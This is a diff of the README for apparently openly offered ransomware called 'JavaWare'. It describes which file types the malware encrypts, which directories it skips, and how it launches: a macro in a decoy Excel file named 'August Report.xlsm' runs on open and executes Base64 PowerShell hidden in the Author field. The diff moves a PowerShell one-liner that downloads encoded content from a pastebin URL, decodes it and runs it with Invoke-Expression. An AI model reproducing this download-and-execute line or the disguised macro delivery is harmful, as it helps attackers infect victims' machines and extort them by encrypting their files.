@@ -17,12 +17,12 @@ JavaWare is a ransomware which will observe your system, learn which files you u
 
 ### What does it encrypt?
 > *FileTypes.java* defines what type of files to encrypt, it includes common document types and so will avoid program files to ensure your system is still functional. Similarly, *AvoidedDir.java* includes directories to avoid in traversal, such as *Windows* and *Program Files*. The PowerShell script is: 
-```powershell
-Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1JDNWfqP).content)
-```
 
 ### How does it launch?
 The Microsoft Excel file, *August Report.xlsm* contains a Macro which is run on Workbook Open. Encoded Base64 PowerShell code is hidden within this file under the 'Author' field. So the macro calls a function which gets the author, decodes it, and then runs the shell. 
+```powershell
+Powershell Invoke-Expression -Command  $([string]([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((Invoke-WebRequest -Uri https://pastebin.com/raw/1JDNWfqP).content)
+```
 ###
 
 
